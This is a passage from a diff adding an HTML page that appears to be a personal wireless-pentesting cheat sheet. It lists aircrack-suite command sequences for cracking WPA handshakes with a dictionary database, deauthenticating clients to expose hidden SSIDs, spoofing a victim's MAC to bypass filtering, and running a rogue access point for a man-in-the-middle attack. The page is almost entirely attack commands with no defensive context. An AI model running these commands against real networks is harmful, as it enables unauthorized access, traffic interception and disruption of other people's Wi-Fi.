+</span><span id="__span-30-6"><a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a>root@backbox:~# airolib-ng NEW_DB --import passwd &lt;DictionaryFile&gt;
+</span><span id="__span-30-7"><a id="__codelineno-30-7" name="__codelineno-30-7" href="#__codelineno-30-7"></a>root@backbox:~# airolib-ng NEW_DB --clean all
+</span><span id="__span-30-8"><a id="__codelineno-30-8" name="__codelineno-30-8" href="#__codelineno-30-8"></a>root@backbox:~# airolib-ng NEW_DB --stats
+</span><span id="__span-30-9"><a id="__codelineno-30-9" name="__codelineno-30-9" href="#__codelineno-30-9"></a>root@backbox:~# airolib-ng NEW_DB --batch
+</span><span id="__span-30-10"><a id="__codelineno-30-10" name="__codelineno-30-10" href="#__codelineno-30-10"></a>root@backbox:~# airolib-ng NEW_DB --verify all
+</span><span id="__span-30-11"><a id="__codelineno-30-11" name="__codelineno-30-11" href="#__codelineno-30-11"></a>root@backbox:~# aircrack-ng -r NEW_DB &lt;Handshaked_PCAP&gt;
+</span></code></pre></div>
+FIND HIDDEN SSID</p>
+<hr />
+<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>root@backbox:~# airmon-ng start wlan0
+</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>root@backbox:~# airodump-ng -c &lt;Channel&gt; --bssid &lt;BSSID&gt; wlan0mon
+</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a>root@backbox:~# aireplay-ng -0 20 -a &lt;BSSID&gt; -c &lt;VictimMac&gt; wlan0mon 
+</span></code></pre></div>
+<h2 id="bypass-mac-filtering">BYPASS MAC FILTERING</h2>
+<p><div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>root@backbox:~# airmon-ng start wlan0
+</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a>root@backbox:~# airodump-ng -c &lt;AP_Channel&gt; --bssid &lt;BSSID&gt; -w &lt;FileName&gt; wlan0mon
+</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a>root@backbox:~# aireplay-ng -0 10 --a &lt;BSSID&gt; -c &lt;VictimMac&gt; wlan0mon
+</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a>root@backbox:~# ifconfig wlan0mon down
+</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a>root@backbox:~# macchanger --mac &lt;VictimMac&gt; wlan0mon
+</span><span id="__span-32-6"><a id="__codelineno-32-6" name="__codelineno-32-6" href="#__codelineno-32-6"></a>root@backbox:~# ifconfig wlan0mon up
+</span><span id="__span-32-7"><a id="__codelineno-32-7" name="__codelineno-32-7" href="#__codelineno-32-7"></a>root@backbox:~# aireplay-ng -3 -b &lt;BSSID&gt; -h &lt;FakedMac&gt; wlan0mon
+</span></code></pre></div>
+MAN IN THE MIDDLE ATTACK</p>
+<hr />
+<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>root@backbox:~# airmon-ng start wlan0
+</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>root@backbox:~# airbase-ng -e “&lt;FakeBSSID&gt;” wlan0mon
+</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a>root@backbox:~# brctl addbr &lt;VariableName&gt;
+</span><span id="__span-33-4"><a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a>root@backbox:~# brctl addif &lt;VariableName&gt; wlan0mon
+</span><span id="__span-33-5"><a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a>root@backbox:~# brctl addif &lt;VariableName&gt; at0
+</span><span id="__span-33-6"><a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a>root@backbox:~# ifconfig eth0 0.0.0.0 up
+</span><span id="__span-33-7"><a id="__codelineno-33-7" name="__codelineno-33-7" href="#__codelineno-33-7"></a>root@backbox:~# ifconfig at0 0.0.0.0 up
+</span><span id="__span-33-8"><a id="__codelineno-33-8" name="__codelineno-33-8" href="#__codelineno-33-8"></a>root@backbox:~# ifconfig &lt;VariableName&gt; up
+</span><span id="__span-33-9"><a id="__codelineno-33-9" name="__codelineno-33-9" href="#__codelineno-33-9"></a>root@backbox:~# aireplay-ng -deauth 0 -a &lt;victimBSSID&gt; wlan0mon
+</span><span id="__span-33-10"><a id="__codelineno-33-10" name="__codelineno-33-10" href="#__codelineno-33-10"></a>root@backbox:~# dhclient3 &lt;VariableName&gt; &amp;
+</span><span id="__span-33-11"><a id="__codelineno-33-11" name="__codelineno-33-11" href="#__codelineno-33-11"></a>root@backbox:~# wireshark &amp;; select &lt;VariableName&gt; interface
+</span></code></pre></div>
+
+  <br>
+    
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content">
+      <p>
+        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/explore/resource/wirelesstesting.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
+<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
+</footer>
+
+</body>
+</html>
